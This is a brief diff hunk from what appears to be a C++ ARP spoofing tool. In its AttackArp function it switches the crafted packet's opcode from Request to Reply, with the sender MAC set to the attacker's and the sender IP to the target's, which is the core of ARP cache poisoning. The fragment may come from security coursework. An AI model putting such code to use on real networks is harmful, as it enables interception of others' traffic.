@@ -160,7 +160,7 @@ void AttackArp(pcap_t* pcap, IpMac InSender, Ip InTarget, IpMac InAttacker)
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = InAttacker.MyMac;
     packet.arp_.sip_ = InTarget;
     packet.arp_.tmac_ = InSender.MyMac;
